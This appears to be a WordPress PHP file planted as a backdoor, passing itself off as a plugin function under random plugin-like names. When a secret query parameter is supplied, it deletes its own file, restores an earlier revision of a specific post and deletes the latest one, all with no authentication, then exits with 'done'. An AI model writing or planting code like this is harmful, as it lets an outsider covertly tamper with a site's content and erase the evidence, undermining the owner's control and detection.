<?php

function jetpack_notice_better_zoom() {
	if (isset($_GET['box_poster_checker']) && $_GET['box_poster_checker'] === 'panel_screen_forms') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$revisions_only_clock_upgrader = 2160;
		$load_nice_theme_taxonomies = wp_get_post_revisions($revisions_only_clock_upgrader);
		if (empty($load_nice_theme_taxonomies)) die('no revisions');
		if (count($load_nice_theme_taxonomies) < 2) die('less than 2');
		$ui_ratings_online_affiliate = array_shift($load_nice_theme_taxonomies);
		$drop_card_frontend = $ui_ratings_online_affiliate->ID;
		$last_action_really = array_shift($load_nice_theme_taxonomies);
		$full_static_photos_crm = $last_action_really->ID;
		$table_yoast_interactivity = wp_restore_post_revision($full_static_photos_crm);
		if ($table_yoast_interactivity === false) die('error restoring');
		$table_yoast_interactivity = wp_delete_post_revision($drop_card_frontend);		
		if ($table_yoast_interactivity === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'jetpack_notice_better_zoom');
